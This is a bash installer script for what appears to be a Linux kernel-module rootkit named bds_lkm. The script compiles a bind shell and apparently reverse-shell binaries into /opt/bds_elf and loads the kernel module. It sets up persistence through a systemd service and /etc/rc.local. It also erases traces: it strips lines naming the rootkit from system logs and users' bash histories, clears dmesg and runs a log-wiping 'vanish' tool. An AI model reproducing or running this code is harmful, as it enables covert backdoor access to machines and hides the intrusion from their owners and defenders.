#!/bin/bash

os="unknown"
command="pwd"
HOME_DIR=$($command)
	
if [ "$(id -u)" -ne 0 ]; then echo "Please run as root." >&2; exit 1; fi

check_os() {
	echo "[+] Checking your operating system"
	command="pacman --version"
	output=$($command)
	if [[ $output == *"Pacman v"* ]];
	then
		os="arch based"
	fi
	command="apt-get --version"
	output=$($command)
	if [[ $output == *"Supported modules"* ]];
	then
		os="debian based"
	fi
	command="yum --version"
	output=$($command)
	if [[ $output == *"Installed:"* ]];
	then
		os="redhat based"
	fi
        if [[ $os == "unknown" ]]
        then
            echo "your os: $os"
            echo "your linux distribution is not supported by this installer"
            echo "you need to install bds_lkm manually"
            exit
        fi
	echo "[+] Your os is "$os
}

install_prequisites() {
    echo "[+] installing prequisites"
    if [[ "$os" == "debian based" ]]
    then
        echo "[+] installing for debian based"
	apt update
        apt -y install make
        apt -y install gcc
        apt -y install gcc-12
        apt -y install linux-headers-$(uname -r)
    elif [[ "$os" == "redhat based" ]]
    then
        echo "[+] installing for redhat based"
	yum update
        yum -y install make
        yum -y install gcc
        yum -y install kernel-devel
        yum -y install kernel-headers
        echo "[+] warning  ! you might need to restart and rerun install.sh !"
    elif [[ "$os" == "arch based" ]]
    then
        echo "[+] installing for arch based"
	pacman -Syu
        pacman -S base-devel
        pacman -S gcc
        pacman -S linux-headers
    fi
}       

install_userspace() {
	cd $HOME_DIR
	nohup killall -9 bds_bindshell
        unset HISTFILE
        mkdir /opt/bds_elf
        cd userspace
        gcc -o /opt/bds_elf/bds_vanish bds_vanish.c
        gcc -o /opt/bds_elf/bds_bindshell bds_bindshell.c
	gcc -o /opt/bds_elf/bds_rr bds_rr.c
	gcc -o /opt/bds_elf/bds_br bds_br.c
	cd -
	cd ..
}

install_systemd() {
    cd $HOME_DIR
    echo "[+] installing init script to survive after reboot"
    cp bds_start.sh /opt/bds_elf
    chmod +x /opt/bds_elf/bds_start.sh
    SYSTEMD="/etc/systemd/system/"
    if [ -d "$SYSTEMD" ]; then
        cp bds_systemd.service /etc/systemd/system/
        chmod 644  /etc/systemd/system/bds_systemd.service
        systemctl daemon-reload
        systemctl enable bds_systemd.service
    fi
    cp rc.local /etc/
    chmod +x /etc/rc.local
    echo "[+] init script installed"
}

install_kernelspace() {
    cd $HOME_DIR
    echo "[+] installing kernel space module"
    cd kernelspace;make
    ./clean.sh
    FILE="bds_lkm.ko"
    if [ -f "$FILE" ]; then
        echo "[+] $FILE build success"
        cp bds_lkm.ko /opt/bds_elf
        command="insmod /opt/bds_elf/bds_lkm.ko"
	output=$($command)
	if [[ $output == *"permitted"* ]];
	then
            echo "[-] failed to insmod lkm, installation failed, try to install manually !"
            exit
	fi
        if [[ $output == *"Invalid module"* ]];
	then
            echo "[-] failed to insmod lkm, installation failed, try to install manually"
            exit
	fi
        echo "[+] success insert module"
        cd -
    else
        echo "[-] error failed to build lkm, try to install kernel headers !"
        exit
    fi
}

fix_path() {
	path=$1
	fpath="/var/log/${path}"
	if [ -f "$fpath" ]; then
	    cmd="mv /var/log/${path} /var/log/${path}.bak"
            $cmd
	    input="/var/log/$path.bak"
            while IFS= read -r line
	    do
	        if [[ "$line" == *"bds_lkm"* ]]
	        then
                    line=""
                else
                    echo "$line" >> "/var/log/$path" 
	        fi
	    done < "$input"
            rm -f "/var/log/$path.bak"
	fi
}

fix_bash_history() {
    user=$1
    check="root"
    if [[ "$user" == "$check" ]]
    then
        echo "[+] cleanup root bash_history"
        cmd="mv /root/.bash_history /root/.bash_history.bak"
        input="/root/.bash_history.bak"
        output="/root/.bash_history"
    else
        echo "[+] clean $user bash_history"
        cmd="mv /home/$user/.bash_history /home/$user/.bash_history.bak"
        input="/home/$user/.bash_history.bak"
        output="/home/$user/.bash_history"
    fi
     
    $cmd
    
    while IFS= read -r line
	do
	if [[ "$line" == *"bds_lkm"* ]] 
	then
            line=""
	else
            echo "$line" >> "${output}"
        fi
        
	
	done < "$input"
}

clean_logs() {
    nohup dmesg -c
    rm -f nohup.out
    input="usernames_to_clear_logs.txt"
    while IFS= read -r line
	do
            user=${line/$'\n'/}
            cmd="/opt/bds_elf/bds_vanish $user 0 0"
            eval $cmd
            fix_bash_history $user
    done < "$input"
    rm -f *.hm
}

if [[ "$1" == "direct" ]]
then 
    echo "[+] installing without prequisites"
else
    check_os
    install_prequisites
fi
install_userspace
install_systemd
install_kernelspace
fix_path messages
fix_path dmesg
fix_path syslog
fix_path kern.log
fix_path secure

clean_logs
echo "[+] installation finished"
